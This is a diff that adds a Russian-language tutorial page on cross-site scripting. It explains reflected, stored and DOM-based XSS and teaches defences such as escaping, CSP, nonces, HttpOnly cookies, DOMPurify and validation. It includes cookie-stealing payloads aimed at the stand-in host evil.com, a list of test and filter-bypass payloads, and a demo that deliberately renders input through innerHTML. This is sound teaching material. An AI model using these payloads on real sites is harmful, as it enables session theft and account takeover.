@@ -1,0 +1,362 @@
+---
+title: "12. XSS: атаки и защита"
+sidebar:
+  order: 11
+---
+import { Playground } from '@components/Playground'
+
+## Что такое XSS?
+
+**XSS (Cross-Site Scripting)** — внедрение вредоносного JavaScript кода на веб-страницу, который выполняется в браузере жертвы.
+
+**Что может сделать XSS:**
+- Украсть куки сессии → похитить аккаунт
+- Перехватить нажатия клавиш (keylogger)
+- Перенаправить на фишинговый сайт
+- Выполнить действия от имени пользователя
+- Заразить компьютер через браузер
+
+## Типы XSS
+
+### 1. Reflected XSS (отражённый)
+
+Вредоносный код в URL, сервер "отражает" его обратно:
+
+```
+https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+
+# Сервер вставляет q в ответ без экранирования:
+<p>Результаты поиска: <script>document.location=...</script></p>
+```
+
+Требует: жертва переходит по специально подготовленной ссылке.
+
+### 2. Stored XSS (хранимый)
+
+Вредоносный код сохраняется в базе данных:
+
+```
+Злоумышленник публикует комментарий:
+"Отличная статья! <script>fetch('https://evil.com/steal?c='+btoa(document.cookie))</script>"
+
+Теперь каждый, кто просматривает статью, отправляет свои куки злоумышленнику.
+```
+
+Самый опасный тип — не нужно заставлять жертву кликать.
+
+### 3. DOM-based XSS
+
+Вредоносный код выполняется через манипуляцию DOM в JavaScript:
+
+```javascript
+// Уязвимый код
+const name = new URLSearchParams(location.search).get('name');
+document.getElementById('welcome').innerHTML = `Привет, ${name}!`;
+
+// URL атаки:
+// https://example.com?name=<img src=x onerror=alert(1)>
+```
+
+## Защита
+
+### 1. Экранирование вывода
+
+**Правило №1**: всё, что приходит от пользователя и выводится в HTML — экранируй!
+
+```javascript
+// Опасно!
+element.innerHTML = userInput;
+
+// Безопасно
+element.textContent = userInput;
+
+// Если нужен HTML — используй DOMPurify
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(userInput);
+```
+
+**В React** — по умолчанию безопасно:
+
+```jsx
+// Безопасно: React автоматически экранирует
+const Comment = ({ text }) => <p>{text}</p>;
+
+// ОПАСНО: dangerouslySetInnerHTML без санитизации
+const Comment = ({ html }) => (
+  <div dangerouslySetInnerHTML={{ __html: html }} />
+);
+
+// Безопасно с DOMPurify
+import DOMPurify from 'dompurify';
+const Comment = ({ html }) => (
+  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+);
+```
+
+**На сервере (Node.js)**:
+
+```javascript
+import he from 'he'; // HTML Entities
+
+function escapeHTML(str) {
+  return str
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
+// Или используй библиотеку
+const escaped = he.encode(userInput);
+```
+
+### 2. Content Security Policy (CSP)
+
+CSP — HTTP заголовок, указывающий браузеру, откуда можно загружать ресурсы.
+
+```javascript
+// Express
+app.use((req, res, next) => {
+  res.setHeader('Content-Security-Policy', 
+    "default-src 'self'; " +
+    "script-src 'self' 'nonce-{RANDOM}'; " +  // только скрипты с nonce
+    "style-src 'self' https://fonts.googleapis.com; " +
+    "img-src 'self' data: https:; " +
+    "font-src 'self' https://fonts.gstatic.com; " +
+    "connect-src 'self' https://api.example.com; " +
+    "frame-src 'none'; " +           // запрет iframe
+    "object-src 'none';"             // запрет Flash/plugins
+  );
+  next();
+});
+```
+
+```javascript
+// Next.js: next.config.js
+const securityHeaders = [
+  {
+    key: 'Content-Security-Policy',
+    value: [
+      "default-src 'self'",
+      "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
+      // Для строгого CSP с nonce — нужна генерация per-request
+    ].join('; '),
+  },
+];
+
+module.exports = {
+  async headers() {
+    return [
+      {
+        source: '/(.*)',
+        headers: securityHeaders,
+      },
+    ];
+  },
+};
+```
+
+### 3. Nonce для inline scripts
+
+```javascript
+import crypto from 'crypto';
+
+// Генерируем уникальный nonce для каждого запроса
+app.use((req, res, next) => {
+  const nonce = crypto.randomBytes(16).toString('base64');
+  res.locals.nonce = nonce;
+  
+  res.setHeader('Content-Security-Policy',
+    `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`
+  );
+  
+  next();
+});
+
+// В шаблоне
+// <script nonce="<%= nonce %>">// ваш inline скрипт</script>
+```
+
+### 4. HttpOnly Cookies
+
+Куки с флагом `httpOnly` недоступны JavaScript — XSS не сможет украсть сессию:
+
+```javascript
+res.cookie('sessionId', token, {
+  httpOnly: true,  // защита от XSS!
+  secure: true,    // только HTTPS
+  sameSite: 'Lax',
+});
+```
+
+### 5. Санитизация Rich Text
+
+Если нужен Markdown/HTML от пользователя:
+
+```bash
+npm install dompurify jsdom
+```
+
+```javascript
+import { JSDOM } from 'jsdom';
+import createDOMPurify from 'dompurify';
+
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+
+function sanitizeHTML(dirty) {
+  return DOMPurify.sanitize(dirty, {
+    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'code'],
+    ALLOWED_ATTR: ['href', 'rel'],
+    // Запрещаем javascript: в href
+    FORBID_CONTENTS: ['script'],
+  });
+}
+
+// Или для Markdown — используй marked + DOMPurify
+import { marked } from 'marked';
+
+function renderMarkdown(md) {
+  const rawHTML = marked(md);
+  return DOMPurify.sanitize(rawHTML);
+}
+```
+
+### 6. Валидация входных данных
+
+```javascript
+import { z } from 'zod';
+
+const commentSchema = z.object({
+  text: z.string()
+    .min(1)
+    .max(1000)
+    .refine(text => !/<script/i.test(text), {
+      message: 'HTML not allowed',
+    }),
+  postId: z.string().uuid(),
+});
+
+app.post('/api/comments', async (req, res) => {
+  const result = commentSchema.safeParse(req.body);
+  
+  if (!result.success) {
+    return res.status(400).json({ error: result.error.issues });
+  }
+  
+  // Безопасно сохраняем
+  const comment = await db.comments.create(result.data);
+  res.json(comment);
+});
+```
+
+## Проверка защиты
+
+### XSS Test Payloads
+
+```html
+<!-- Базовые тесты -->
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+javascript:alert('XSS')
+
+<!-- Обходы фильтров -->
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<img src=x oNErRoR=alert(1)>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+```
+
+### Инструменты
+
+- [XSS Game](https://xss-game.appspot.com/) — практика
+- [DOMPurify Demo](https://cure53.de/purify) — тест санитайзера
+- Browser DevTools → Application → CSP violations
+
+## Итог: Чеклист защиты от XSS
+
+- [ ] React: не используешь `dangerouslySetInnerHTML` без DOMPurify
+- [ ] Все пользовательские данные экранированы при выводе
+- [ ] CSP заголовок настроен
+- [ ] Куки с `HttpOnly` флагом
+- [ ] Rich text санитизируется DOMPurify
+- [ ] Входные данные валидируются (Zod, Joi)
+- [ ] URL параметры не попадают в innerHTML напрямую
+
+## Практические задания
+
+1. Найди XSS уязвимость в https://xss-game.appspot.com/
+2. Настрой CSP заголовки для Next.js приложения
+3. Добавь DOMPurify для вывода пользовательских комментариев
+4. Проверь приложение через [https://securityheaders.com](https://securityheaders.com)
+
+## Попробуй: XSS — атака и защита
+
+<Playground client:visible
+  template="static"
+  files={{
+    '/index.html': `<!DOCTYPE html>
+<html>
+<head>
+<style>
+  body { font-family: system-ui; background: #1a1a2e; color: #fff; padding: 20px; }
+  h2 { margin-top: 0; }
+  input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #444; background: #0f0f23; color: #fff; font-size: 14px; margin-bottom: 10px; box-sizing: border-box; }
+  .panel { background: #0f0f23; padding: 14px; border-radius: 8px; margin-bottom: 12px; border: 1px solid #ffffff1a; }
+  .danger { border-color: #ef4444; }
+  .safe { border-color: #22c55e; }
+  label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 4px; }
+  .tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; }
+</style>
+</head>
+<body>
+  <h2>XSS: innerHTML vs textContent</h2>
+  <p style="color: #94a3b8; font-size: 13px;">Попробуй ввести: <code>&lt;img src=x onerror=alert(1)&gt;</code></p>
+  <input id="userInput" placeholder='Введи текст или HTML...' value='Hello <b>World</b>' oninput="render()" />
+
+  <div class="panel danger">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+      <strong style="color: #ef4444;">innerHTML (ОПАСНО)</strong>
+      <span class="tag" style="background: #ef444433; color: #ef4444;">XSS уязвимость</span>
+    </div>
+    <div id="unsafe" style="background: #1e293b; padding: 10px; border-radius: 6px; min-height: 20px;"></div>
+    <pre id="unsafeCode" style="font-size: 11px; color: #64748b; margin: 6px 0 0; overflow-x: auto;"></pre>
+  </div>
+
+  <div class="panel safe">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+      <strong style="color: #22c55e;">textContent (БЕЗОПАСНО)</strong>
+      <span class="tag" style="background: #22c55e33; color: #22c55e;">Экранирован</span>
+    </div>
+    <div id="safe" style="background: #1e293b; padding: 10px; border-radius: 6px; min-height: 20px;"></div>
+    <pre id="safeCode" style="font-size: 11px; color: #64748b; margin: 6px 0 0; overflow-x: auto;"></pre>
+  </div>
+
+  <div class="panel safe">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+      <strong style="color: #22c55e;">Ручное экранирование</strong>
+      <span class="tag" style="background: #22c55e33; color: #22c55e;">Sanitized</span>
+    </div>
+    <div id="escaped" style="background: #1e293b; padding: 10px; border-radius: 6px; min-height: 20px;"></div>
+  </div>
+
+  <script>
+    function escapeHTML(str) {
+      return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    function render() {
+      const val = document.getElementById('userInput').value;
+      document.getElementById('unsafe').innerHTML = val;
+      document.getElementById('unsafeCode').textContent = 'element.innerHTML = userInput;';
+      document.getElementById('safe').textContent = val;
+      document.getElementById('safeCode').textContent = 'element.textContent = userInput;';
+      document.getElementById('escaped').innerHTML = escapeHTML(val);
+    }
+    render();
+  </script>
+</body>
+</html>`
+  }}
+/>
